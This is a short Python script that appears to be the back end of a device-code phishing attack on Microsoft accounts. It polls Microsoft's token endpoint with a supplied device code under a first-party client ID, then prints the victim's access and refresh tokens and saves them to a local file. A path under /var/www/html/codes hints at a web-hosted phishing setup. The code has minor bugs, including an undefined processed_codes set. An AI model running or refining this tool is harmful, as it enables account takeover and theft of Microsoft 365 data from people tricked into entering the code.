import argparse
import time
import re
import os
import requests
from datetime import datetime

# DON'T RUN THIS IN YOUR WEB ROOT AS IT WILL OUTPUT ACCESS TOKENS
# TO A FILE CALLED "access_tokens.txt" IN THE SAME DIRECTORY. IF
# YOU DO THIS YOU MAY EXPOSE ACCESS TOKENS ON YOUR WEB SERVER.

# Oauth Code
device_code = ""

def complete_oauth_flow(auth_code):
        token_url = "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0"

    # Define the request parameters
        data = {
            "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
            "code": auth_code,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "resource": "https://graph.microsoft.com"
        }

        # Make a POST request to obtain the access and refresh tokens
        continue_flag = True
        while continue_flag:
            response = requests.post(token_url, data=data)
            # Check if the request was successful
            if response.status_code == 200:
                continue_flag = False
                # Parse the JSON response to extract tokens
                token_data = response.json()
                access_token = token_data.get("access_token")
                refresh_token = token_data.get("refresh_token")
                print("\nAccess Token:", access_token)
                print("Refresh Token:", refresh_token)

                # Get the current date and time
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                # Write access tokens with timestamp to a file (append mode)
                print("\n[*] Appending access tokens to access_tokens.txt")
                with open("access_tokens.txt", "a") as token_file:  # Use "a" for append mode
                    token_file.write(f"[{timestamp}] Access Token: {access_token}\n")
                    token_file.write(f"[{timestamp}] Refresh Token: {refresh_token}\n")
                # Add the processed code to the set
                processed_codes.add(auth_code)
            else:
                if((response.json())['error'] == "authorization_pending"):
                    print("OAuth authorization pending...")
                    time.sleep(3)
                    continue
                else:
                    print("[*] OAuth flow failed with status code:", response.status_code)
                    print(response.text)
                    continue_flag = False

def main():
    global device_code

    path = "/var/www/html/codes/"  # Directory where the 'codes.txt' file is located
    codes_file_path = os.path.join(path, "codes.txt")
    parser = argparse.ArgumentParser()
    parser.add_argument("code")
    args = parser.parse_args()
    device_code = args.code
    complete_oauth_flow(device_code)


if __name__ == "__main__":
    main()
